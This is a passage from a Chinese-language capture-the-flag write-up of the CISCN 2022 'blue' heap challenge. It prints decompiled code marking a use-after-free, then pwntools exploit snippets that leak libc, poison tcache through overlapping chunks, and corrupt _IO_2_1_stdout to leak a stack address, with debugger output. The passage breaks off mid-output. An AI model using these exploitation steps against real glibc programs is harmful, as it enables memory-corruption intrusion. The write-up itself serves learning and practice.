keyword\">else</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token function\">sub_1592</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//dele 无 UAF</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"sub_1730开启沙盒\"><a class=\"markdownIt-Anchor\" href=\"#sub_1730开启沙盒\">#</a> sub_1730 (开启沙盒)</h3>\n<p><img data-src=\"/img/ciscn_2022_blue/image-20240621141506838.png\" alt=\"image-20240621141506838\"></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>__int64 <span class=\"token function\">sub_1663</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_4070 <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// 只能使用一次这个函数</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">sub_12A8</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&amp;&amp;</span> dword_4180<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 存在 UAF</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token operator\">++</span>dword_4070<span class=\"token punctuation\">;</span><span class=\"token comment\">//delete_count</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DONE!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">sub_1289</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0xFFFFFFFFLL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> dword_406C <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span><span class=\"token comment\">// 同样只能 show 一次</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>  <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please input idx: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  v1 <span class=\"token operator\">=</span> <span class=\"token function\">str_2_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">&amp;&amp;</span> dword_4180<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>qword_4080<span class=\"token punctuation\">[</span>v1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token operator\">++</span>dword_406C<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Done!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ERROR\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">int_secc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      <span class=\"token function\">meau</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      v3 <span class=\"token operator\">=</span> <span class=\"token function\">str_2_int</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token function\">uaf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">666</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>LABEL_13<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      a1 <span class=\"token operator\">=</span> <span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token function\">puts_0</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid choice\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">></span> <span class=\"token number\">3</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a1<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v3 <span class=\"token operator\">!=</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>          <span class=\"token keyword\">goto</span> LABEL_13<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token function\">dele</span><span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">,</span> a2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"/img/ciscn_2022_blue/image-20240621142032888.png\" alt=\"image-20240621142032888\"></p>\n<p>可见程序只 ban 了 execve，还是比较简单的。</p>\n<blockquote>\n<p>存在沙盒，一般我想到的是去利用 env 去泄露栈地址，然后再去劫持返回地址。</p>\n<p>只需要将 orw 写到返回地址上即可。</p>\n</blockquote>\n<h2 id=\"思路规整\"><a class=\"markdownIt-Anchor\" href=\"#思路规整\">#</a> 思路规整</h2>\n<p>show 只有一次，那如何即去泄露 libc 地址，又去泄露 stack 地址呢？显然想要 show 两次是不合适。第一次 show 只能是泄露 libc，因为去泄露 libc 之后才能得到 env。</p>\n<p>所以可以将 tcache 打满，然后利用 unsortedbin 去泄露 libc</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>而第二次我们需要去泄露 env，但是 uaf 和 show 都用过一次了，那如何去利用呢。</p>\n<p>那么就需要去了解一下 IO_FILE 了，stdout。<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjAyMjM3L2FydGljbGUvZGV0YWlscy8xMTM4NDUzMjA=\">好好说话之 IO_FILE 利用（1）：利用_IO_2_1_stdout 泄露 libc_libc 泄露方式 - CSDN 博客</span></p>\n<p>这篇文章已经写的很详细了。</p>\n<p>从此文中，我们可以将 fake 一个堆块到_IO_2_1_stdout，然后将其 Flags 改成 <code>0xfdab1800</code> ，再将 _IO_write_base 改成我们想泄露的地址的 <code>起始地址</code> ，最后把 _IO_write_ptr 和 _IO_write_end 改成泄露地址的 <code>终点地址</code> 即可。</p>\n<p>但是程序当中已经没有 uaf，那如何在去控制 fd 去做我们的 fake_chunk 呢？</p>\n<p>利用 tcache 去做是比较简单的。那如何去利用呢？</p>\n<p>对，使用堆拓展攻击即可。</p>\n<p><img data-src=\"/img/ciscn_2022_blue/image-20240621145849635.png\" alt=\"image-20240621145849635\"></p>\n<p>这是此时 bins 链表。所以我们需要修改一下泄露 libc 的代码，要不然无法进行堆拓展攻击</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'Leaklibc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'gep'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tdele<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>uaf<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>__malloc_hook <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>libcbase <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>env <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'environ'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>success<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libcbase<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>接下来进行堆拓展攻击</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#置入 unsortedbin 内</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># debug()</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#此时 unsortedbin 内包含这 tcache</span></pre></td></tr></table></figure><p><img data-src=\"/img/ciscn_2022_blue/image-20240621151328883.png\" alt=\"image-20240621151328883\"></p>\n<p>此时我们去申请一个 chunk 使其从 unsortedbin 拿取。所以申请个 0x70（size&lt;0x110 且不能等于 0x80</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'tcache'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#0</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>dele<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x91</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>stdout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#此时就会修改 tcache 的 fd 指针   #2</span></pre></td></tr></table></figure><p>然后此时再去申请 0x80 的 chunk 就可以得到 _IO_2_1_stdout 的 chunk</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'nextptr'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>add<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfdab1800</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>env<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#4</span></pre></td></tr></table></figure><blockquote>\n<p>pwndbg&gt; dps 0x7ffff7fc26a0<br>\n00:0000│ rsi 0x7ffff7fc26a0 (<em>IO_2_1_stdout</em>) ◂— 0xfdab1800<br>\n01:0008│     0x7ffff7fc26a8 (<em>IO_2_1_stdout</em>+8) ◂— 0x0<br>\n… ↓        2 skipped<br>\n04:0020│     0x7ffff7fc26c0 (<em>IO_2_1_stdout</em>+32) —▸ 0x7ffff7fc4600 (environ) —▸ 0x7fffffffdef8 —▸ 0x7fffffffe25e ◂— ‘SHELL=/bin/bash’<br>\n05:0028│     0x7ffff7fc26c8 (<em>IO_2_1_stdout</em>+40) —▸ 0x7ffff7fc4608 ◂— 0x0<br>\n06:0030│     0x7ffff7fc26d0 (<em>IO_2_1_stdout</em>+48) —▸ 0x7ffff7fc4608 